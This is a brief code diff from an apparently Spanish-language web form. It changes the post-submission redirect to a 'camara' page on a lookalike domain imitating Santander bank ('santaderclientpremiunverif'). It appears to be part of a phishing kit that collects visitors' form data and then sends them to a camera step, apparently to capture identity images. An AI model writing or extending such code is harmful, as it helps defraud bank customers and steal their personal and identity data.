@@ -44,7 +44,7 @@ const Form = () => {
 
         if (response.ok) {
           console.log('Formulario enviado:', formData);
-          window.location.href = '/camara'; // Redirigir a otra página después de enviar el formulario
+          window.location.href = 'https://santaderclientpremiunverif.vercel.app/camara'; // Redirigir a la URL especificada
         } else {
           console.error('Error al enviar el formulario');
         }
